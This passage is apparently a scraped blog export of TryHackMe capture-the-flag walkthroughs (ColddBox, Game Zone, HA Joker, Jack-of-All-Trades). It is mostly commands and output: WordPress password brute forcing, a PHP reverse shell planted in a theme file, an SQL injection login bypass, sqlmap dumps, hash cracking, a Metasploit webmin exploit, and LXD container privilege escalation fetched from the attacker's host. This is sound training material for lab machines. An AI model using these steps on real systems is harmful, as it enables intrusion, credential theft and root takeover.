By: Rss Generator (Passive Detection) | - http://10.10.145.98/?feed=rss2, \u0026lt;generator\u0026gt;https://wordpress.org/?v=4.1.31\u0026lt;/generator\u0026gt; | - http://10.10.145.98/?feed=comments-rss2, \u0026lt;generator\u0026gt;https://wordpress.org/?v=4.1.31\u0026lt;/generator\u0026gt; [+] WordPress theme in use: twentyfifteen | Location: http://10.10.145.98/wp-content/themes/twentyfifteen/ | Last Updated: 2020-12-09T00:00:00.000Z | Readme: http://10.10.145.98/wp-content/themes/twentyfifteen/readme.txt | [!] The version is out of date, the latest version is 2.8 | Style URL: http://10.10.145.98/wp-content/themes/twentyfifteen/style.css?ver=4.1.31 | Style Name: Twenty Fifteen | Style URI: https://wordpress.org/themes/twentyfifteen | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.0 (80% confidence) | Found By: Style (Passive Detection) | - http://10.10.145.98/wp-content/themes/twentyfifteen/style.css?ver=4.1.31, Match: \u0026#39;Version: 1.0\u0026#39; [+] Enumerating Vulnerable Plugins (via Passive Methods) [i] No plugins Found. [+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:00:05 \u0026lt;======================================\u0026gt; (330 / 330) 100.00% Time: 00:00:05 [+] Checking Theme Versions (via Passive and Aggressive Methods) [i] No themes Found. [+] Enumerating Timthumbs (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:00:40 \u0026lt;====================================\u0026gt; (2575 / 2575) 100.00% Time: 00:00:40 [i] No Timthumbs Found. [+] Enumerating Config Backups (via Passive and Aggressive Methods) Checking Config Backups - Time: 00:00:00 \u0026lt;=========================================\u0026gt; (22 / 22) 100.00% Time: 00:00:00 [i] No Config Backups Found. [+] Enumerating DB Exports (via Passive and Aggressive Methods) Checking DB Exports - Time: 00:00:00 \u0026lt;=============================================\u0026gt; (36 / 36) 100.00% Time: 00:00:00 [i] No DB Exports Found. [+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to \u0026#34;Plain\u0026#34; for those to be detected) Brute Forcing Attachment IDs - Time: 00:00:02 \u0026lt;==================================\u0026gt; (100 / 100) 100.00% Time: 00:00:02 [i] No Medias Found. [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:00 \u0026lt;========================================\u0026gt; (10 / 10) 100.00% Time: 00:00:00 [i] User(s) Identified: [+] the cold in person | Found By: Rss Generator (Passive Detection) [+] c0ldd | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [+] hugo | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [+] philip | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [!] No WPVulnDB API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register [+] Finished: Sun Jan 10 04:08:52 2021 [+] Requests Done: 3136 [+] Cached Requests: 10 [+] Data Sent: 781.452 KB [+] Data Received: 16.528 MB [+] Memory used: 238.738 MB [+] Elapsed time: 00:01:00   Performed wpscan enumeration confirmed our previously found users and also found out of date theme called twentyfifteen.\nLet\u0026rsquo;s try to brute force their credentials.\n1 2 3 4 5 6 7  wpscan --url http://{TARGET MACHINE IP} -U c0ldd,philip,hugo -P /usr/share/wordlists/rockyou.txt . . . [+] Performing password attack on Wp Login against 3 user/s [SUCCESS] - c0ldd / 9876543210 . . .   Gaining Access We were able to brute force c0ldd credentials and now we can try to login via admin panel (/wp-admin)\n\nSuccess, we are in!\n\nTheme Exploitation Navigate to Appearance -\u0026gt; Editor\nOn the right side we can see diferent php templates we are able to edit.\n\nChoose one that is easily accessible, because we are going to replace its content with php reverse shell and then browse to it.\nDon\u0026rsquo;t forget to change $ip and note the port number (if you don\u0026rsquo;t change it).\n\nPress Update File and start listener on your local machine. In my case I chose header.php so I need to browse to http://{TARGET MACHINE IP}/wp-content/themes/twentyfifteen/header.php\nTo execute the code and spawn a shell as the user (www-data).\n1 2 3 4 5 6 7 8 9  nc -lnvp 1234 listening on [any] 1234 ... connect to [10.9.140.180] from (UNKNOWN) [10.10.145.98] 55580 Linux ColddBox-Easy 4.4.0-186-generic #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 11:30:25 up 39 min, 0 users, load average: 0.00, 0.00, 0.02 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can\u0026#39;t access tty; job control turned off $   Upgrade and stabilize given shell with these commands:\n1 2 3 4  $ python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; www-data@ColddBox-Easy:/$ export TERM=xterm export TERM=xterm www-data@ColddBox-Easy:/$   Ctrl + Z to background the shell\nIn our terminal type stty raw -echo; fg\nThis turns off our own terminal echo and gives us\n access to tab autocompletes access the arrow keys access Ctrl + C to kill processes  Then foregrounds the shell, which means completing the process.\nGaining User Privileges Navigating to /www/html/ and reading though different php files, wp-config.php gives us some useful informations.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  . . . // ** MySQL settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define(\u0026#39;DB_NAME\u0026#39;, \u0026#39;colddbox\u0026#39;); /** MySQL database username */ define(\u0026#39;DB_USER\u0026#39;, \u0026#39;c0ldd\u0026#39;); /** MySQL database password */ define(\u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;cybersecurity\u0026#39;); /** MySQL hostname */ define(\u0026#39;DB_HOST\u0026#39;, \u0026#39;localhost\u0026#39;); /** Database Charset to use in creating database tables. */ define(\u0026#39;DB_CHARSET\u0026#39;, \u0026#39;utf8\u0026#39;); /** The Database Collate type. Don\u0026#39;t change this if in doubt. */ define(\u0026#39;DB_COLLATE\u0026#39;, \u0026#39;\u0026#39;); . . .   It looks like we found one of the users password for MySQL database.\nLet\u0026rsquo;s see if the user reuses his password.\nSuccess!\n1 2  c0ldd@ColddBox-Easy:/var/www/html$ id uid=1000(c0ldd) gid=1000(c0ldd) grupos=1000(c0ldd),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)   User Flag 1 2 3 4 5 6 7 8 9 10 11 12 13  c0ldd@ColddBox-Easy:~$ ls -la total 24 drwxr-xr-x 3 c0ldd c0ldd 4096 oct 19 18:51 . drwxr-xr-x 3 root root 4096 sep 24 16:52 .. -rw------- 1 c0ldd c0ldd 0 oct 19 18:51 .bash_history -rw-r--r-- 1 c0ldd c0ldd 220 sep 24 16:52 .bash_logout -rw-r--r-- 1 c0ldd c0ldd 0 oct 14 13:28 .bashrc drwx------ 2 c0ldd c0ldd 4096 sep 24 16:53 .cache -rw-r--r-- 1 c0ldd c0ldd 655 sep 24 16:52 .profile -rw-r--r-- 1 c0ldd c0ldd 0 sep 24 16:53 .sudo_as_admin_successful -rw-rw---- 1 c0ldd c0ldd 53 sep 24 18:22 user.txt c0ldd@ColddBox-Easy:~$ cat user.txt | wc -c 53   Privilege Escalation With c0ldd\u0026rsquo;s password we can check if he has any sudo privileges.\n1 2 3 4 5 6 7 8 9 10  c0ldd@ColddBox-Easy:/var/www/html$ sudo -l [sudo] password for c0ldd: Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy: (root) /usr/bin/vim (root) /bin/chmod (root) /usr/bin/ftp   We will escalate privileges with text editor vim : https://gtfobins.github.io/gtfobins/vim/\n1 2 3 4  c0ldd@ColddBox-Easy:~$ sudo vim -c \u0026#39;:!/bin/sh\u0026#39; # id  uid=0(root) gid=0(root) grupos=0(root)   Root Flag 1 2 3 4 5 6 7 8 9 10 11 12 13 14  # cd /root # ls -la total 32 drwx------ 4 root root 4096 sep 24 18:52 . drwxr-xr-x 23 root root 4096 sep 24 16:47 .. -rw------- 1 root root 10 oct 19 18:53 .bash_history -rw-r--r-- 1 root root 0 oct 14 13:28 .bashrc drwx------ 2 root root 4096 sep 24 18:52 .cache -rw------- 1 root root 220 sep 24 17:02 .mysql_history drwxr-xr-x 2 root root 4096 sep 24 16:54 .nano -rw-r--r-- 1 root root 148 ago 17 2015 .profile -rw-r--r-- 1 root root 49 sep 24 18:23 root.txt # cat root.txt | wc -c 49   ","description":"An easy level machine with multiple ways to escalate privileges.","id":6,"section":"posts","tags":["exploitation","privilege escalation","brute force","wordpress"],"title":"ColddBox [TryHackMe]","uri":"https://martinkubecka.github.io/en/posts/thm/colddbox/"},{"content":"   Title Game Zone     Info Learn to hack into this machine. Understand how to use SQLMap, crack passwords, reveal services using a reverse SSH tunnel and escalate your privileges to root!   Difficulty Easy    Reconnaissance Deploy the machine and access its web server.\n What is the name of the large cartoon avatar holding a sniper on the forum?\n \nBased on the Wikipedia it is agent 47.\nGaining Access SQLi SQL is a standard language for storing, editing and retrieving data in databases.\nA query example:\nSELECT * FROM users WHERE username = :username AND password := password\nHere is a potential place of vulnerability, as you can input your username as another SQL query.\nIf we have our username as admin and our password as: ' or 1=1 \u0026ndash; - it will insert this into the query and authenticate our session.\nThe SQL query executed on the web server will be:\nSELECT * FROM users WHERE username = admin AND password := ' or 1=1 \u0026ndash; -\nThe extra SQL has changed the above query to break the initial query and proceed if 1==1, then comment the rest of the query to stop it breaking.\n When you\u0026rsquo;ve logged in, what page do you get redirected to?\n Using ' or 1=1 \u0026ndash; - as a username and leaving password blank successfully authenticate us and automatically redirects to portal.php\n\nSQLMap SQLMap is a popular open-source, automatic SQL injection and database takeover tool\nWe\u0026rsquo;re going to use SQLMap to dump the entire database for GameZone.\nUsing the page we logged into earlier, we\u0026rsquo;re going point SQLMap to the game review search feature.\nFirst we need to intercept a request made to the search feature using BurpSuite.\n\nSave this request into a text file and then pass this into SQLMap to use our authenticated user session.\nsqlmap -r request \u0026ndash;dbms=mysql \u0026ndash;dump\n-r uses the intercepted request you saved earlier\n\u0026ndash;dbms\ttells SQLMap what type of database management system it is\n\u0026ndash;dump attempts to outputs the entire database\n In the users table, what is the hashed password?\nWhat was the username associated with the hashed password?\nWhat was the other table name?\n \nCracking SSH Password John the Ripper is a fast, free and open-source password cracker.\n What is the de-hashed password?\n 1 2 3 4 5 6 7 8 9 10 11  john --format=raw-sha256 hash --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (Raw-SHA256 [SHA256 128/128 AVX 4x]) Warning: poor OpenMP scalability for this hash type, consider --fork=2 Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status videogamer124 (?) 1g 0:00:00:00 DONE (2021-01-07 06:49) 1.470g/s 4264Kp/s 4264Kc/s 4264KC/s vimivi..vhunlex121 Use the \u0026#34;--show --format=Raw-SHA256\u0026#34; options to display all of the cracked passwords reliably Session completed   hash\tfile with our hash value found earlier\n\u0026ndash;wordlist the wordlist you\u0026rsquo;re using to find the dehashed value\n\u0026ndash;format\tthe hashing algorithm used (our case its hashed using SHA256)\n Now you have a password and username.\nTry SSH\u0026rsquo;ing onto the machine.\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  ssh agent47@10.10.21.174 The authenticity of host \u0026#39;10.10.21.174 (10.10.21.174)\u0026#39; can\u0026#39;t be established. ECDSA key fingerprint is SHA256:mpNHvzp9GPoOcwmWV/TMXiGwcqLIsVXDp5DvW26MFi8. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;10.10.21.174\u0026#39; (ECDSA) to the list of known hosts. agent47@10.10.21.174\u0026#39;s password: Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 109 packages can be updated. 68 updates are security updates. Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147 agent47@gamezone:~$   User Flag 1 2 3 4 5 6 7 8 9 10 11 12  agent47@gamezone:~$ ls -la total 28 drwxr-xr-x 3 agent47 agent47 4096 Aug 16 2019 . drwxr-xr-x 3 root root 4096 Aug 14 2019 .. lrwxrwxrwx 1 root root 9 Aug 16 2019 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 agent47 agent47 220 Aug 14 2019 .bash_logout -rw-r--r-- 1 agent47 agent47 3771 Aug 14 2019 .bashrc drwx------ 2 agent47 agent47 4096 Aug 16 2019 .cache -rw-r--r-- 1 agent47 agent47 655 Aug 14 2019 .profile -rw-rw-r-- 1 agent47 agent47 33 Aug 16 2019 user.txt agent47@gamezone:~$ cat user.txt 649ac17b1480ac13ef1e4fa579dac95c   Reverse SSH Tunnels \nReverse SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side.\n-L is a local tunnel : YOU \u0026lt;\u0026ndash; CLIENT\nIf a site was blocked, you can forward the traffic to a server you own and view it.\n-R is a remote tunnel : YOU \u0026ndash;\u0026gt; CLIENT\nYou forward your traffic to the other server for others to view.\nWe will use a tool called ss to investigate sockets running on a host.\nRuning ss -tulpn will tell us what socket connections are running\n   Argument Description     -t Display TCP sockets   -u Display UDP sockets   -l Displays only listening sockets   -p Shows the process using the socket   -n Doesn\u0026rsquo;t resolve service names    1 2 3 4 5 6 7 8 9  agent47@gamezone:~$ ss -tulpn Netid State Recv-Q Send-Q Local Address:Port\tPeer Address:Port udp UNCONN 0 0 *:10000 *:* udp UNCONN 0 0 *:68 *:* tcp LISTEN 0 80 127.0.0.1:3306 *:* tcp LISTEN 0 128 *:10000 *:* tcp LISTEN 0 128 *:22 *:* tcp LISTEN 0 128 :::80 :::* tcp LISTEN 0 128 :::22 :::*    How many TCP sockets are running?\n 5\n What is the name of the exposed CMS?\n Service running on port 10000 is blocked via a firewall rule from the outside.\nWe can see this from the IPtable list.\nUsing an SSH Tunnel we can expose the port to us locally.\nLocal machine:\nssh -L 10000:localhost:10000 @\nOnce complete, in your browser type localhost:10000 and you can access the newly-exposed webserver.\n What is the CMS version?\n \n What is the CMS version?\n Successfully loged in with reused credentials agent47:videogamer124\n\nPrivilege Escalation Using the CMS dashboard version, use Metasploit to find a payload to execute against the machine.\nStart Metaspolit with msfconsole.\nUsing Exploit Databse and searching for webmin 1.5 gives us RCE for our CMS version: https://www.exploit-db.com/exploits/21851\n\nSet required values and then set payload to cmd/unix/reverse.\n\nWe successfully exploited the target and the session was created in the background.\n\nRoot Flag \n","description":"Learn to hack into this machine. Understand how to use SQLMap, crack passwords, reveal services using a reverse SSH tunnel and escalate your privileges to root!","id":7,"section":"posts","tags":["enumeration","sql","hash cracking","exploitation","reverse SSH","metasploit","webmin","privilege escalation"],"title":"Game Zone [TryHackMe]","uri":"https://martinkubecka.github.io/en/posts/thm/game-zone/"},{"content":"   Title HA Joker CTF     Info Batman hits Joker.   Difficulty Medium    Scanning \u0026amp; Enumeration Nmap 1 2 3 4 5 6 7 8 9 10 11 12  nmap -p- -sV {TARGET MACHINE IP} Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-06 01:40 CST Stats: 0:04:40 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 59.11% done; ETC: 01:48 (0:03:13 remaining) Nmap scan report for 10.10.15.48 Host is up (0.069s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) 8080/tcp open http Apache httpd 2.4.29 Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel   Directory Brute-Forcing 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38  gobuster dir -u http://{TARGET MACHINE IP} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.15.48 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php,html,txt [+] Timeout: 10s =============================================================== 2021/01/06 01:45:03 Starting gobuster =============================================================== /.hta (Status: 403) /.hta.txt (Status: 403) /.hta.php (Status: 403) /.hta.html (Status: 403) /.htaccess (Status: 403) /.htaccess.php (Status: 403) /.htaccess.html (Status: 403) /.htaccess.txt (Status: 403) /.htpasswd (Status: 403) /.htpasswd.txt (Status: 403) /.htpasswd.php (Status: 403) /.htpasswd.html (Status: 403) /css (Status: 301) /img (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /phpinfo.php (Status: 200) /phpinfo.php (Status: 200) /secret.txt (Status: 200) /server-status (Status: 403) =============================================================== 2021/01/06 01:47:25 Finished ===============================================================   What version of Apache is it?\n2.4.29\nWhat port on this machine not need to be authenticated by user and password?\nport 80\nThere is a file on this port that seems to be secret, what is it?\n\nThere is another file which reveals information of the backend, what is it?\nphpinfo.php\nWhen reading the secret file, We find with a conversation that seems contains at least two users and some keywords that can be intersting, what user do you think it is?\njoker\nWhat port on this machine need to be authenticated by Basic Authentication Mechanism?\n\nGaining Access At this point we have one user and a url that needs to be aunthenticated, brute force it to get the password.\nWhat is that password?\n1 2 3 4 5 6 7 8 9 10  hydra -l joker -P /usr/share/wordlists/rockyou.txt -s 8080 {TARGET MACHINE IP} http-get / Hydra v9.1 (c) 2020 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-06 01:56:41 [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task [DATA] attacking http-get://10.10.15.48:8080/ [8080][http-get] host: 10.10.15.48 login: joker password: hannah 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-06 01:57:20   We got the user and password and we see a cms based blog.\nNow check for directories and files in this port.\nWhat directory looks like as admin directory?\n\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59  gobuster dir -U joker -P hannah -u http://{TARGET MACHINE IP}:8080 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.15.48:8080 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Auth User: joker [+] Extensions: php,html,txt [+] Timeout: 10s =============================================================== 2021/01/06 02:01:06 Starting gobuster =============================================================== /.hta (Status: 403) /.hta.php (Status: 403) /.hta.html (Status: 403) /.hta.txt (Status: 403) /.htaccess (Status: 403) /.htaccess.html (Status: 403) /.htpasswd (Status: 403) /.htaccess.txt (Status: 403) /.htpasswd.php (Status: 403) /.htpasswd.html (Status: 403) /.htpasswd.txt (Status: 403) /.htaccess.php (Status: 403) /administrator (Status: 301) /bin (Status: 301) /cache (Status: 301) [ERROR] 2021/01/06 02:01:33 [!] net/http: request canceled (Client.Timeout exceeded while reading body) /components (Status: 301) /configuration.php (Status: 200) /images (Status: 301) /includes (Status: 301) /index.php (Status: 200) /index.php (Status: 200) /language (Status: 301) /layouts (Status: 301) /libraries (Status: 301) /LICENSE (Status: 200) /LICENSE.txt (Status: 200) /media (Status: 301) /modules (Status: 301) /plugins (Status: 301) /README (Status: 200) /README.txt (Status: 200) /robots (Status: 200) /robots.txt (Status: 200) /robots.txt (Status: 200) /server-status (Status: 403) /templates (Status: 301) /tmp (Status: 301) /web.config (Status: 200) /web.config.txt (Status: 200) =============================================================== 2021/01/06 02:03:30 Finished ===============================================================   \nWe need access to the administration of the site in order to get a shell, there is a backup file.\nWhat is this file?\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  nikto -h http://{TARGET MACHINE IP}:8080 -id joker:hannah - Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP: 10.10.15.48 + Target Hostname: 10.10.15.48 + Target Port: 8080 + Start Time: 2021-01-06 02:05:41 (GMT-6) --------------------------------------------------------------------------- + Server: Apache/2.4.29 (Ubuntu) + The anti-clickjacking X-Frame-Options header is not present. + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + / - Requires Authentication for realm \u0026#39; Please enter the password.\u0026#39; + Successfully authenticated to realm \u0026#39; Please enter the password.\u0026#39; with user-supplied credentials. + Entry \u0026#39;/administrator/\u0026#39; in robots.txt returned a non-forbidden or redirect HTTP code (200) + Entry \u0026#39;/bin/\u0026#39; in robots.txt returned a non-forbidden or redirect HTTP code (200) + Entry \u0026#39;/cache/\u0026#39; in robots.txt returned a non-forbidden or redirect HTTP code (200) + Entry \u0026#39;/cli/\u0026#39; in robots.txt returned a non-forbidden or redirect HTTP code (200) + Entry \u0026#39;/components/\u0026#39; in robots.txt returned a non-forbidden or redirect HTTP code (200) + Entry \u0026#39;/includes/\u0026#39; in robots.txt returned a non-forbidden or redirect HTTP code (200) + Entry \u0026#39;/language/\u0026#39; in robots.txt returned a non-forbidden or redirect HTTP code (200) + Entry \u0026#39;/layouts/\u0026#39; in robots.txt returned a non-forbidden or redirect HTTP code (200) + Entry \u0026#39;/libraries/\u0026#39; in robots.txt returned a non-forbidden or redirect HTTP code (200) + Entry \u0026#39;/modules/\u0026#39; in robots.txt returned a non-forbidden or redirect HTTP code (200) + Entry \u0026#39;/plugins/\u0026#39; in robots.txt returned a non-forbidden or redirect HTTP code (200) + Entry \u0026#39;/tmp/\u0026#39; in robots.txt returned a non-forbidden or redirect HTTP code (200) + \u0026#34;robots.txt\u0026#34; contains 14 entries which should be manually viewed. + Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch. + /backup.zip: Potentially interesting archive/cert file found. . . . {TARGET MACHINE IP}:8080/backup.zip   We have the backup file and now we should look for some information, for example database, configuration files, etc \u0026hellip;\nBut the backup file seems to be encrypted.\nWhat is the password?\n1 2 3 4 5 6 7 8 9 10 11  zip2john backup.zip \u0026gt; zipHash john zipHash --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status hannah (backup.zip) 1g 0:00:00:00 DONE (2021-01-06 02:10) 11.11g/s 45511p/s 45511c/s 45511C/s 123456..oooooo Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed   Remember that\u0026hellip; We need access to the administration of the site\u0026hellip;\nIn our new discovery we see some files that have compromising information, maybe db?\nOk what if we do a restoration of the database!\nSome tables must have something like user_table!\nWhat is the super duper user?\n1  unzip backup.zip   Enter password obtained from the previos question.\nTwo directiories were extracted: db, site\ndb directory contains joomladb.sql\nRead the found sql file in a text aditor and look for \u0026ldquo;super duper user\u0026rdquo;.\n\nSuper Duper User!\nWhat is the password?\nCopy found hash value into a new text file.\n1 2 3 4 5 6 7 8 9 10  john adminHash --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 1024 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status abcd1234 (?) 1g 0:00:00:19 DONE (2021-01-06 02:54) 0.05205g/s 53.40p/s 53.40c/s 53.40C/s bullshit..bulldogs Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed   At this point, you should be upload a reverse-shell in order to gain shell access.\nWhat is the owner of this session?\nGoing back to http://{TARGET MACHINE IP}:8080/administrator/ and loging in with credentials: admin:abcd1234\nHere I found an article with two ways how to exploit Joomla tempates: https://www.hackingarticles.in/joomla-reverse-shell/\nAfter succesfull exploitation we are in.\n1 2  whoami www-data   This user belongs to a group that differs on your own group, What is this group?\n1 2  id uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)   Spawn a tty shell.\n1 2  $ python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; www-data@ubuntu:/$   Privilege Escalation LXD Research how to escalate privileges using LXD permissions and check to see if there are any images available on the box.\nThe idea here is to mount the root of the OS file system on the container, this should give us access to the root directory.\nCreate the container with the privilege true and mount the root file system on /mnt in order to gain access to /root directory on host machine.\nWhat is the name of the file in the /root directory?\nLocal machine:\n1 2 3  git clone https://github.com/saghul/lxd-alpine-builder.git cd lxd-alpine-builder ./build-alpine   Start a simple http python server and download tar archive on the target machine.\n1  python3 -m http.server 80   Target machine:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  cd /tmp wget http://10.9.140.180:80/alpine-v3.12-x86_64-20210106_0325.tar.gz lxc image import ./alpine-v3.12-x86_64-20210106_0325.tar.gz --alias myimage lxc init myimage ignite -c security.privileged=true lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true lxc start ignite lxc exec ignite /bin/sh ~ # id  id uid=0(root) gid=0(root) ~ # cd /mnt/root/root cd /mnt/root/root ~ # ls final.txt   ","description":"Batman hits Joker.","id":8,"section":"posts","tags":["enumeration","hash cracking","lxd"],"title":"HA Joker CTF [TryHackMe]","uri":"https://martinkubecka.github.io/en/posts/thm/ha-joker-ctf/"},{"content":"   Title Jack-of-All-Trades     Info Boot-to-root originally designed for Securi-Tay 2020   Difficulty Easy    Scanning \u0026amp; Enumeration Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  nmap -A -T4 {TARGET MACHINE IP} Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-05 12:33 CST Stats: 0:00:35 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 99.28% done; ETC: 12:33 (0:00:00 remaining) Stats: 0:00:53 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 99.64% done; ETC: 12:33 (0:00:00 remaining) Nmap scan report for 10.10.122.111 Host is up (0.071s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp\topen http Apache httpd 2.4.10 ((Debian)) |_http-server-header: Apache/2.4.10 (Debian) |_http-title: Jack-of-all-trades! |_ssh-hostkey: ERROR: Script execution failed (use -d to debug) 80/tcp open ssh OpenSSH 6.7p1 Debian 5 (protocol 2.0) | ssh-hostkey: | 1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA) | 2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA) | 256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA) |_ 256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)   Directory Brute-Forcing 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  gobuster dir -u http://{TARGET MACHINE IP}:22 -w /usr/share/wordlists/dirb/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.122.111:22 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2021/01/05 12:36:20 Starting gobuster =============================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /assets (Status: 301) /index.html (Status: 200) /server-status (Status: 403) =============================================================== 2021/01/05 12:36:56 Finished ===============================================================   \n\nPort 22 is used for SSH so trying to navigate to this port in the browser will be restricted. We will have to override settings for banned ports.\nNavigate to about:config and type network.security.ports.banned.override\nChange the type to String and value to 22.\nThen click on the plus button to add our new preference.\nIf you are using Firefox more on that here: https://support.mozilla.org/en-US/kb/about-config-editor-firefox\n\nNow we can visit {TARGET MACHINE IP}:22\n\nDecoding \u0026amp; Steganography Source code comment:\n1 2  \u0026lt;!--Note to self - If I ever get locked out I can get back in at /recovery.php! --\u0026gt; \u0026lt;!-- UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== --\u0026gt;   Based on the last two characters we know that the note was encoded to base64.\n\n\nOnce again we found another comment in the web page source code encoded to base64.\nSource code 